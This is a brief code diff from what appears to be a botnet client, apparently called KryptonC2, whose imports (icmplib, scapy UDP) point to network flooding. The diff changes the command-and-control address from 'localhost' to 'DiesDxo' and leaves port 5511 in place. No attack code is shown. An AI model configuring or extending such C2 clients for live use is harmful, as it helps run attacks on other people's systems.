@@ -11,7 +11,7 @@ from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
 # IP AND PORT C2 ------------------->
-KRYPTONC2_ADDRESS  = "localhost"
+KRYPTONC2_ADDRESS  = "DiesDxo"
 KRYPTONC2_PORT     = 5511
 
 
